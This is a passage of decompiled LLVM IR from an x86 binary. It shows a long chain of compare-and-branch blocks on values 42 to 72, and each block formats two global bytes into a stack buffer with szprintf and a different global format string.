  %v4_804a5dd = call i32 @szprintf(i32 %v2_804a5cb, i32 ptrtoint ([13 x i8]* @global_var_80592e0.71 to i32), i32 %v1_804a5bc)
  br label %dec_label_pc_804a5e2

dec_label_pc_804a5e2:                             ; preds = %dec_label_pc_804a5ac, %dec_label_pc_804a5b2
  %v13_804a5e2 = icmp eq i32 %v2_8049ce5, 42
  %v1_804a5e6 = icmp eq i1 %v13_804a5e2, false
  br i1 %v1_804a5e6, label %dec_label_pc_804a618, label %dec_label_pc_804a5e8

dec_label_pc_804a5e8:                             ; preds = %dec_label_pc_804a5e2
  %v0_804a5e8 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a5e8 = zext i8 %v0_804a5e8 to i32
  store i32 %v1_804a5e8, i32* @edx, align 4
  %v0_804a5f2 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a5f2 = zext i8 %v0_804a5f2 to i32
  %v2_804a601 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a601, i32* @ebx, align 4
  %v4_804a613 = call i32 @szprintf(i32 %v2_804a601, i32 ptrtoint ([13 x i8]* @global_var_80592ed.72 to i32), i32 %v1_804a5f2)
  br label %dec_label_pc_804a618

dec_label_pc_804a618:                             ; preds = %dec_label_pc_804a5e2, %dec_label_pc_804a5e8
  %v13_804a618 = icmp eq i32 %v2_8049ce5, 43
  %v1_804a61c = icmp eq i1 %v13_804a618, false
  br i1 %v1_804a61c, label %dec_label_pc_804a64e, label %dec_label_pc_804a61e

dec_label_pc_804a61e:                             ; preds = %dec_label_pc_804a618
  %v0_804a61e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a61e = zext i8 %v0_804a61e to i32
  store i32 %v1_804a61e, i32* @edx, align 4
  %v0_804a628 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a628 = zext i8 %v0_804a628 to i32
  %v2_804a637 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a637, i32* @ebx, align 4
  %v4_804a649 = call i32 @szprintf(i32 %v2_804a637, i32 ptrtoint ([13 x i8]* @global_var_80592fa.73 to i32), i32 %v1_804a628)
  br label %dec_label_pc_804a64e

dec_label_pc_804a64e:                             ; preds = %dec_label_pc_804a618, %dec_label_pc_804a61e
  %v13_804a64e = icmp eq i32 %v2_8049ce5, 44
  %v1_804a652 = icmp eq i1 %v13_804a64e, false
  br i1 %v1_804a652, label %dec_label_pc_804a684, label %dec_label_pc_804a654

dec_label_pc_804a654:                             ; preds = %dec_label_pc_804a64e
  %v0_804a654 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a654 = zext i8 %v0_804a654 to i32
  store i32 %v1_804a654, i32* @edx, align 4
  %v0_804a65e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a65e = zext i8 %v0_804a65e to i32
  %v2_804a66d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a66d, i32* @ebx, align 4
  %v4_804a67f = call i32 @szprintf(i32 %v2_804a66d, i32 ptrtoint ([13 x i8]* @global_var_80592ed.72 to i32), i32 %v1_804a65e)
  br label %dec_label_pc_804a684

dec_label_pc_804a684:                             ; preds = %dec_label_pc_804a64e, %dec_label_pc_804a654
  %v13_804a684 = icmp eq i32 %v2_8049ce5, 45
  %v1_804a688 = icmp eq i1 %v13_804a684, false
  br i1 %v1_804a688, label %dec_label_pc_804a6ba, label %dec_label_pc_804a68a

dec_label_pc_804a68a:                             ; preds = %dec_label_pc_804a684
  %v0_804a68a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a68a = zext i8 %v0_804a68a to i32
  store i32 %v1_804a68a, i32* @edx, align 4
  %v0_804a694 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a694 = zext i8 %v0_804a694 to i32
  %v2_804a6a3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6a3, i32* @ebx, align 4
  %v4_804a6b5 = call i32 @szprintf(i32 %v2_804a6a3, i32 ptrtoint ([13 x i8]* @global_var_8059307.74 to i32), i32 %v1_804a694)
  br label %dec_label_pc_804a6ba

dec_label_pc_804a6ba:                             ; preds = %dec_label_pc_804a684, %dec_label_pc_804a68a
  %v13_804a6ba = icmp eq i32 %v2_8049ce5, 46
  %v1_804a6be = icmp eq i1 %v13_804a6ba, false
  br i1 %v1_804a6be, label %dec_label_pc_804a6f0, label %dec_label_pc_804a6c0

dec_label_pc_804a6c0:                             ; preds = %dec_label_pc_804a6ba
  %v0_804a6c0 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a6c0 = zext i8 %v0_804a6c0 to i32
  store i32 %v1_804a6c0, i32* @edx, align 4
  %v0_804a6ca = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a6ca = zext i8 %v0_804a6ca to i32
  %v2_804a6d9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6d9, i32* @ebx, align 4
  %v4_804a6eb = call i32 @szprintf(i32 %v2_804a6d9, i32 ptrtoint ([13 x i8]* @global_var_8059314.75 to i32), i32 %v1_804a6ca)
  br label %dec_label_pc_804a6f0

dec_label_pc_804a6f0:                             ; preds = %dec_label_pc_804a6ba, %dec_label_pc_804a6c0
  %v13_804a6f0 = icmp eq i32 %v2_8049ce5, 47
  %v1_804a6f4 = icmp eq i1 %v13_804a6f0, false
  br i1 %v1_804a6f4, label %dec_label_pc_804a726, label %dec_label_pc_804a6f6

dec_label_pc_804a6f6:                             ; preds = %dec_label_pc_804a6f0
  %v0_804a6f6 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a6f6 = zext i8 %v0_804a6f6 to i32
  store i32 %v1_804a6f6, i32* @edx, align 4
  %v0_804a700 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a700 = zext i8 %v0_804a700 to i32
  %v2_804a70f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a70f, i32* @ebx, align 4
  %v4_804a721 = call i32 @szprintf(i32 %v2_804a70f, i32 ptrtoint ([13 x i8]* @global_var_8059321.76 to i32), i32 %v1_804a700)
  br label %dec_label_pc_804a726

dec_label_pc_804a726:                             ; preds = %dec_label_pc_804a6f0, %dec_label_pc_804a6f6
  %v10_804a726 = icmp eq i32 %v2_8049ce5, 48
  %v1_804a72a = icmp eq i1 %v10_804a726, false
  br i1 %v1_804a72a, label %dec_label_pc_804a75c, label %dec_label_pc_804a72c

dec_label_pc_804a72c:                             ; preds = %dec_label_pc_804a726
  %v0_804a72c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a72c = zext i8 %v0_804a72c to i32
  store i32 %v1_804a72c, i32* @edx, align 4
  %v0_804a736 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a736 = zext i8 %v0_804a736 to i32
  %v2_804a745 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a745, i32* @ebx, align 4
  %v4_804a757 = call i32 @szprintf(i32 %v2_804a745, i32 ptrtoint ([13 x i8]* @global_var_805932e.77 to i32), i32 %v1_804a736)
  br label %dec_label_pc_804a75c

dec_label_pc_804a75c:                             ; preds = %dec_label_pc_804a726, %dec_label_pc_804a72c
  %v13_804a75c = icmp eq i32 %v2_8049ce5, 49
  %v1_804a760 = icmp eq i1 %v13_804a75c, false
  br i1 %v1_804a760, label %dec_label_pc_804a792, label %dec_label_pc_804a762

dec_label_pc_804a762:                             ; preds = %dec_label_pc_804a75c
  %v0_804a762 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a762 = zext i8 %v0_804a762 to i32
  store i32 %v1_804a762, i32* @edx, align 4
  %v0_804a76c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a76c = zext i8 %v0_804a76c to i32
  %v2_804a77b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a77b, i32* @ebx, align 4
  %v4_804a78d = call i32 @szprintf(i32 %v2_804a77b, i32 ptrtoint ([13 x i8]* @global_var_805933b.78 to i32), i32 %v1_804a76c)
  br label %dec_label_pc_804a792

dec_label_pc_804a792:                             ; preds = %dec_label_pc_804a75c, %dec_label_pc_804a762
  %v13_804a792 = icmp eq i32 %v2_8049ce5, 50
  %v1_804a796 = icmp eq i1 %v13_804a792, false
  br i1 %v1_804a796, label %dec_label_pc_804a7c8, label %dec_label_pc_804a798

dec_label_pc_804a798:                             ; preds = %dec_label_pc_804a792
  %v0_804a798 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a798 = zext i8 %v0_804a798 to i32
  store i32 %v1_804a798, i32* @edx, align 4
  %v0_804a7a2 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a7a2 = zext i8 %v0_804a7a2 to i32
  %v2_804a7b1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7b1, i32* @ebx, align 4
  %v4_804a7c3 = call i32 @szprintf(i32 %v2_804a7b1, i32 ptrtoint ([13 x i8]* @global_var_8059348.79 to i32), i32 %v1_804a7a2)
  br label %dec_label_pc_804a7c8

dec_label_pc_804a7c8:                             ; preds = %dec_label_pc_804a792, %dec_label_pc_804a798
  %v13_804a7c8 = icmp eq i32 %v2_8049ce5, 51
  %v1_804a7cc = icmp eq i1 %v13_804a7c8, false
  br i1 %v1_804a7cc, label %dec_label_pc_804a7fe, label %dec_label_pc_804a7ce

dec_label_pc_804a7ce:                             ; preds = %dec_label_pc_804a7c8
  %v0_804a7ce = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a7ce = zext i8 %v0_804a7ce to i32
  store i32 %v1_804a7ce, i32* @edx, align 4
  %v0_804a7d8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a7d8 = zext i8 %v0_804a7d8 to i32
  %v2_804a7e7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7e7, i32* @ebx, align 4
  %v4_804a7f9 = call i32 @szprintf(i32 %v2_804a7e7, i32 ptrtoint ([14 x i8]* @global_var_8059355.80 to i32), i32 %v1_804a7d8)
  br label %dec_label_pc_804a7fe

dec_label_pc_804a7fe:                             ; preds = %dec_label_pc_804a7c8, %dec_label_pc_804a7ce
  %v13_804a7fe = icmp eq i32 %v2_8049ce5, 52
  %v1_804a802 = icmp eq i1 %v13_804a7fe, false
  br i1 %v1_804a802, label %dec_label_pc_804a834, label %dec_label_pc_804a804

dec_label_pc_804a804:                             ; preds = %dec_label_pc_804a7fe
  %v0_804a804 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a804 = zext i8 %v0_804a804 to i32
  store i32 %v1_804a804, i32* @edx, align 4
  %v0_804a80e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a80e = zext i8 %v0_804a80e to i32
  %v2_804a81d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a81d, i32* @ebx, align 4
  %v4_804a82f = call i32 @szprintf(i32 %v2_804a81d, i32 ptrtoint ([13 x i8]* @global_var_8059363.81 to i32), i32 %v1_804a80e)
  br label %dec_label_pc_804a834

dec_label_pc_804a834:                             ; preds = %dec_label_pc_804a7fe, %dec_label_pc_804a804
  %v13_804a834 = icmp eq i32 %v2_8049ce5, 53
  %v1_804a838 = icmp eq i1 %v13_804a834, false
  br i1 %v1_804a838, label %dec_label_pc_804a86a, label %dec_label_pc_804a83a

dec_label_pc_804a83a:                             ; preds = %dec_label_pc_804a834
  %v0_804a83a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a83a = zext i8 %v0_804a83a to i32
  store i32 %v1_804a83a, i32* @edx, align 4
  %v0_804a844 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a844 = zext i8 %v0_804a844 to i32
  %v2_804a853 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a853, i32* @ebx, align 4
  %v4_804a865 = call i32 @szprintf(i32 %v2_804a853, i32 ptrtoint ([14 x i8]* @global_var_8059370.82 to i32), i32 %v1_804a844)
  br label %dec_label_pc_804a86a

dec_label_pc_804a86a:                             ; preds = %dec_label_pc_804a834, %dec_label_pc_804a83a
  %v13_804a86a = icmp eq i32 %v2_8049ce5, 54
  %v1_804a86e = icmp eq i1 %v13_804a86a, false
  br i1 %v1_804a86e, label %dec_label_pc_804a8a0, label %dec_label_pc_804a870

dec_label_pc_804a870:                             ; preds = %dec_label_pc_804a86a
  %v0_804a870 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a870 = zext i8 %v0_804a870 to i32
  store i32 %v1_804a870, i32* @edx, align 4
  %v0_804a87a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a87a = zext i8 %v0_804a87a to i32
  %v2_804a889 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a889, i32* @ebx, align 4
  %v4_804a89b = call i32 @szprintf(i32 %v2_804a889, i32 ptrtoint ([13 x i8]* @global_var_805937e.83 to i32), i32 %v1_804a87a)
  br label %dec_label_pc_804a8a0

dec_label_pc_804a8a0:                             ; preds = %dec_label_pc_804a86a, %dec_label_pc_804a870
  %v13_804a8a0 = icmp eq i32 %v2_8049ce5, 55
  %v1_804a8a4 = icmp eq i1 %v13_804a8a0, false
  br i1 %v1_804a8a4, label %dec_label_pc_804a8d6, label %dec_label_pc_804a8a6

dec_label_pc_804a8a6:                             ; preds = %dec_label_pc_804a8a0
  %v0_804a8a6 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a8a6 = zext i8 %v0_804a8a6 to i32
  store i32 %v1_804a8a6, i32* @edx, align 4
  %v0_804a8b0 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a8b0 = zext i8 %v0_804a8b0 to i32
  %v2_804a8bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8bf, i32* @ebx, align 4
  %v4_804a8d1 = call i32 @szprintf(i32 %v2_804a8bf, i32 ptrtoint ([14 x i8]* @global_var_805938b.84 to i32), i32 %v1_804a8b0)
  br label %dec_label_pc_804a8d6

dec_label_pc_804a8d6:                             ; preds = %dec_label_pc_804a8a0, %dec_label_pc_804a8a6
  %v13_804a8d6 = icmp eq i32 %v2_8049ce5, 56
  %v1_804a8da = icmp eq i1 %v13_804a8d6, false
  br i1 %v1_804a8da, label %dec_label_pc_804a90c, label %dec_label_pc_804a8dc

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8d6
  %v0_804a8dc = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a8dc = zext i8 %v0_804a8dc to i32
  store i32 %v1_804a8dc, i32* @edx, align 4
  %v0_804a8e6 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a8e6 = zext i8 %v0_804a8e6 to i32
  %v2_804a8f5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8f5, i32* @ebx, align 4
  %v4_804a907 = call i32 @szprintf(i32 %v2_804a8f5, i32 ptrtoint ([14 x i8]* @global_var_8059399.85 to i32), i32 %v1_804a8e6)
  br label %dec_label_pc_804a90c

dec_label_pc_804a90c:                             ; preds = %dec_label_pc_804a8d6, %dec_label_pc_804a8dc
  %v13_804a90c = icmp eq i32 %v2_8049ce5, 57
  %v1_804a910 = icmp eq i1 %v13_804a90c, false
  br i1 %v1_804a910, label %dec_label_pc_804a942, label %dec_label_pc_804a912

dec_label_pc_804a912:                             ; preds = %dec_label_pc_804a90c
  %v0_804a912 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a912 = zext i8 %v0_804a912 to i32
  store i32 %v1_804a912, i32* @edx, align 4
  %v0_804a91c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a91c = zext i8 %v0_804a91c to i32
  %v2_804a92b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a92b, i32* @ebx, align 4
  %v4_804a93d = call i32 @szprintf(i32 %v2_804a92b, i32 ptrtoint ([13 x i8]* @global_var_80593a7.86 to i32), i32 %v1_804a91c)
  br label %dec_label_pc_804a942

dec_label_pc_804a942:                             ; preds = %dec_label_pc_804a90c, %dec_label_pc_804a912
  %v13_804a942 = icmp eq i32 %v2_8049ce5, 58
  %v1_804a946 = icmp eq i1 %v13_804a942, false
  br i1 %v1_804a946, label %dec_label_pc_804a978, label %dec_label_pc_804a948

dec_label_pc_804a948:                             ; preds = %dec_label_pc_804a942
  %v0_804a948 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a948 = zext i8 %v0_804a948 to i32
  store i32 %v1_804a948, i32* @edx, align 4
  %v0_804a952 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a952 = zext i8 %v0_804a952 to i32
  %v2_804a961 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a961, i32* @ebx, align 4
  %v4_804a973 = call i32 @szprintf(i32 %v2_804a961, i32 ptrtoint ([13 x i8]* @global_var_80593b4.87 to i32), i32 %v1_804a952)
  br label %dec_label_pc_804a978

dec_label_pc_804a978:                             ; preds = %dec_label_pc_804a942, %dec_label_pc_804a948
  %v13_804a978 = icmp eq i32 %v2_8049ce5, 59
  %v1_804a97c = icmp eq i1 %v13_804a978, false
  br i1 %v1_804a97c, label %dec_label_pc_804a9ae, label %dec_label_pc_804a97e

dec_label_pc_804a97e:                             ; preds = %dec_label_pc_804a978
  %v0_804a97e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a97e = zext i8 %v0_804a97e to i32
  store i32 %v1_804a97e, i32* @edx, align 4
  %v0_804a988 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a988 = zext i8 %v0_804a988 to i32
  %v2_804a997 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a997, i32* @ebx, align 4
  %v4_804a9a9 = call i32 @szprintf(i32 %v2_804a997, i32 ptrtoint ([13 x i8]* @global_var_80593c1.88 to i32), i32 %v1_804a988)
  br label %dec_label_pc_804a9ae

dec_label_pc_804a9ae:                             ; preds = %dec_label_pc_804a978, %dec_label_pc_804a97e
  %v13_804a9ae = icmp eq i32 %v2_8049ce5, 60
  %v1_804a9b2 = icmp eq i1 %v13_804a9ae, false
  br i1 %v1_804a9b2, label %dec_label_pc_804a9e4, label %dec_label_pc_804a9b4

dec_label_pc_804a9b4:                             ; preds = %dec_label_pc_804a9ae
  %v0_804a9b4 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a9b4 = zext i8 %v0_804a9b4 to i32
  store i32 %v1_804a9b4, i32* @edx, align 4
  %v0_804a9be = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a9be = zext i8 %v0_804a9be to i32
  %v2_804a9cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9cd, i32* @ebx, align 4
  %v4_804a9df = call i32 @szprintf(i32 %v2_804a9cd, i32 ptrtoint ([13 x i8]* @global_var_80593ce.89 to i32), i32 %v1_804a9be)
  br label %dec_label_pc_804a9e4

dec_label_pc_804a9e4:                             ; preds = %dec_label_pc_804a9ae, %dec_label_pc_804a9b4
  %v13_804a9e4 = icmp eq i32 %v2_8049ce5, 61
  %v1_804a9e8 = icmp eq i1 %v13_804a9e4, false
  br i1 %v1_804a9e8, label %dec_label_pc_804aa1a, label %dec_label_pc_804a9ea

dec_label_pc_804a9ea:                             ; preds = %dec_label_pc_804a9e4
  %v0_804a9ea = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804a9ea = zext i8 %v0_804a9ea to i32
  store i32 %v1_804a9ea, i32* @edx, align 4
  %v0_804a9f4 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804a9f4 = zext i8 %v0_804a9f4 to i32
  %v2_804aa03 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa03, i32* @ebx, align 4
  %v4_804aa15 = call i32 @szprintf(i32 %v2_804aa03, i32 ptrtoint ([13 x i8]* @global_var_80593db.90 to i32), i32 %v1_804a9f4)
  br label %dec_label_pc_804aa1a

dec_label_pc_804aa1a:                             ; preds = %dec_label_pc_804a9e4, %dec_label_pc_804a9ea
  %v13_804aa1a = icmp eq i32 %v2_8049ce5, 62
  %v1_804aa1e = icmp eq i1 %v13_804aa1a, false
  br i1 %v1_804aa1e, label %dec_label_pc_804aa50, label %dec_label_pc_804aa20

dec_label_pc_804aa20:                             ; preds = %dec_label_pc_804aa1a
  %v0_804aa20 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804aa20 = zext i8 %v0_804aa20 to i32
  store i32 %v1_804aa20, i32* @edx, align 4
  %v0_804aa2a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804aa2a = zext i8 %v0_804aa2a to i32
  %v2_804aa39 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa39, i32* @ebx, align 4
  %v4_804aa4b = call i32 @szprintf(i32 %v2_804aa39, i32 ptrtoint ([13 x i8]* @global_var_80593e8.91 to i32), i32 %v1_804aa2a)
  br label %dec_label_pc_804aa50

dec_label_pc_804aa50:                             ; preds = %dec_label_pc_804aa1a, %dec_label_pc_804aa20
  %v13_804aa50 = icmp eq i32 %v2_8049ce5, 63
  %v1_804aa54 = icmp eq i1 %v13_804aa50, false
  br i1 %v1_804aa54, label %dec_label_pc_804aa86, label %dec_label_pc_804aa56

dec_label_pc_804aa56:                             ; preds = %dec_label_pc_804aa50
  %v0_804aa56 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804aa56 = zext i8 %v0_804aa56 to i32
  store i32 %v1_804aa56, i32* @edx, align 4
  %v0_804aa60 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804aa60 = zext i8 %v0_804aa60 to i32
  %v2_804aa6f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa6f, i32* @ebx, align 4
  %v4_804aa81 = call i32 @szprintf(i32 %v2_804aa6f, i32 ptrtoint ([13 x i8]* @global_var_80593f5.92 to i32), i32 %v1_804aa60)
  br label %dec_label_pc_804aa86

dec_label_pc_804aa86:                             ; preds = %dec_label_pc_804aa50, %dec_label_pc_804aa56
  %v10_804aa86 = icmp eq i32 %v2_8049ce5, 64
  %v1_804aa8a = icmp eq i1 %v10_804aa86, false
  br i1 %v1_804aa8a, label %dec_label_pc_804aabc, label %dec_label_pc_804aa8c

dec_label_pc_804aa8c:                             ; preds = %dec_label_pc_804aa86
  %v0_804aa8c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804aa8c = zext i8 %v0_804aa8c to i32
  store i32 %v1_804aa8c, i32* @edx, align 4
  %v0_804aa96 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804aa96 = zext i8 %v0_804aa96 to i32
  %v2_804aaa5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaa5, i32* @ebx, align 4
  %v4_804aab7 = call i32 @szprintf(i32 %v2_804aaa5, i32 ptrtoint ([13 x i8]* @global_var_8059402.93 to i32), i32 %v1_804aa96)
  br label %dec_label_pc_804aabc

dec_label_pc_804aabc:                             ; preds = %dec_label_pc_804aa86, %dec_label_pc_804aa8c
  %v13_804aabc = icmp eq i32 %v2_8049ce5, 65
  %v1_804aac0 = icmp eq i1 %v13_804aabc, false
  br i1 %v1_804aac0, label %dec_label_pc_804aaf2, label %dec_label_pc_804aac2

dec_label_pc_804aac2:                             ; preds = %dec_label_pc_804aabc
  %v0_804aac2 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804aac2 = zext i8 %v0_804aac2 to i32
  store i32 %v1_804aac2, i32* @edx, align 4
  %v0_804aacc = load i8, i8* @global_var_805e499.29, align 1
  %v1_804aacc = zext i8 %v0_804aacc to i32
  %v2_804aadb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aadb, i32* @ebx, align 4
  %v4_804aaed = call i32 @szprintf(i32 %v2_804aadb, i32 ptrtoint ([13 x i8]* @global_var_805940f.94 to i32), i32 %v1_804aacc)
  br label %dec_label_pc_804aaf2

dec_label_pc_804aaf2:                             ; preds = %dec_label_pc_804aabc, %dec_label_pc_804aac2
  %v13_804aaf2 = icmp eq i32 %v2_8049ce5, 66
  %v1_804aaf6 = icmp eq i1 %v13_804aaf2, false
  br i1 %v1_804aaf6, label %dec_label_pc_804ab28, label %dec_label_pc_804aaf8

dec_label_pc_804aaf8:                             ; preds = %dec_label_pc_804aaf2
  %v0_804aaf8 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804aaf8 = zext i8 %v0_804aaf8 to i32
  store i32 %v1_804aaf8, i32* @edx, align 4
  %v0_804ab02 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ab02 = zext i8 %v0_804ab02 to i32
  %v2_804ab11 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab11, i32* @ebx, align 4
  %v4_804ab23 = call i32 @szprintf(i32 %v2_804ab11, i32 ptrtoint ([13 x i8]* @global_var_805941c.95 to i32), i32 %v1_804ab02)
  br label %dec_label_pc_804ab28

dec_label_pc_804ab28:                             ; preds = %dec_label_pc_804aaf2, %dec_label_pc_804aaf8
  %v13_804ab28 = icmp eq i32 %v2_8049ce5, 67
  %v1_804ab2c = icmp eq i1 %v13_804ab28, false
  br i1 %v1_804ab2c, label %dec_label_pc_804ab5e, label %dec_label_pc_804ab2e

dec_label_pc_804ab2e:                             ; preds = %dec_label_pc_804ab28
  %v0_804ab2e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ab2e = zext i8 %v0_804ab2e to i32
  store i32 %v1_804ab2e, i32* @edx, align 4
  %v0_804ab38 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ab38 = zext i8 %v0_804ab38 to i32
  %v2_804ab47 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab47, i32* @ebx, align 4
  %v4_804ab59 = call i32 @szprintf(i32 %v2_804ab47, i32 ptrtoint ([13 x i8]* @global_var_8059429.96 to i32), i32 %v1_804ab38)
  br label %dec_label_pc_804ab5e

dec_label_pc_804ab5e:                             ; preds = %dec_label_pc_804ab28, %dec_label_pc_804ab2e
  %v13_804ab5e = icmp eq i32 %v2_8049ce5, 68
  %v1_804ab62 = icmp eq i1 %v13_804ab5e, false
  br i1 %v1_804ab62, label %dec_label_pc_804ab94, label %dec_label_pc_804ab64

dec_label_pc_804ab64:                             ; preds = %dec_label_pc_804ab5e
  %v0_804ab64 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ab64 = zext i8 %v0_804ab64 to i32
  store i32 %v1_804ab64, i32* @edx, align 4
  %v0_804ab6e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ab6e = zext i8 %v0_804ab6e to i32
  %v2_804ab7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab7d, i32* @ebx, align 4
  %v4_804ab8f = call i32 @szprintf(i32 %v2_804ab7d, i32 ptrtoint ([13 x i8]* @global_var_8059436.97 to i32), i32 %v1_804ab6e)
  br label %dec_label_pc_804ab94

dec_label_pc_804ab94:                             ; preds = %dec_label_pc_804ab5e, %dec_label_pc_804ab64
  %v13_804ab94 = icmp eq i32 %v2_8049ce5, 69
  %v1_804ab98 = icmp eq i1 %v13_804ab94, false
  br i1 %v1_804ab98, label %dec_label_pc_804abca, label %dec_label_pc_804ab9a

dec_label_pc_804ab9a:                             ; preds = %dec_label_pc_804ab94
  %v0_804ab9a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ab9a = zext i8 %v0_804ab9a to i32
  store i32 %v1_804ab9a, i32* @edx, align 4
  %v0_804aba4 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804aba4 = zext i8 %v0_804aba4 to i32
  %v2_804abb3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abb3, i32* @ebx, align 4
  %v4_804abc5 = call i32 @szprintf(i32 %v2_804abb3, i32 ptrtoint ([13 x i8]* @global_var_8059443.98 to i32), i32 %v1_804aba4)
  br label %dec_label_pc_804abca

dec_label_pc_804abca:                             ; preds = %dec_label_pc_804ab94, %dec_label_pc_804ab9a
  %v13_804abca = icmp eq i32 %v2_8049ce5, 70
  %v1_804abce = icmp eq i1 %v13_804abca, false
  br i1 %v1_804abce, label %dec_label_pc_804ac00, label %dec_label_pc_804abd0

dec_label_pc_804abd0:                             ; preds = %dec_label_pc_804abca
  %v0_804abd0 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804abd0 = zext i8 %v0_804abd0 to i32
  store i32 %v1_804abd0, i32* @edx, align 4
  %v0_804abda = load i8, i8* @global_var_805e499.29, align 1
  %v1_804abda = zext i8 %v0_804abda to i32
  %v2_804abe9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abe9, i32* @ebx, align 4
  %v4_804abfb = call i32 @szprintf(i32 %v2_804abe9, i32 ptrtoint ([13 x i8]* @global_var_8059450.99 to i32), i32 %v1_804abda)
  br label %dec_label_pc_804ac00

dec_label_pc_804ac00:                             ; preds = %dec_label_pc_804abca, %dec_label_pc_804abd0
  %v13_804ac00 = icmp eq i32 %v2_8049ce5, 71
  %v1_804ac04 = icmp eq i1 %v13_804ac00, false
  br i1 %v1_804ac04, label %dec_label_pc_804ac36, label %dec_label_pc_804ac06

dec_label_pc_804ac06:                             ; preds = %dec_label_pc_804ac00
  %v0_804ac06 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ac06 = zext i8 %v0_804ac06 to i32
  store i32 %v1_804ac06, i32* @edx, align 4
  %v0_804ac10 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ac10 = zext i8 %v0_804ac10 to i32
  %v2_804ac1f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac1f, i32* @ebx, align 4
  %v4_804ac31 = call i32 @szprintf(i32 %v2_804ac1f, i32 ptrtoint ([13 x i8]* @global_var_805945d.100 to i32), i32 %v1_804ac10)
  br label %dec_label_pc_804ac36

dec_label_pc_804ac36:                             ; preds = %dec_label_pc_804ac00, %dec_label_pc_804ac06
  %v13_804ac36 = icmp eq i32 %v2_8049ce5, 72
  %v1_804ac3a = icmp eq i1 %v13_804ac36, false
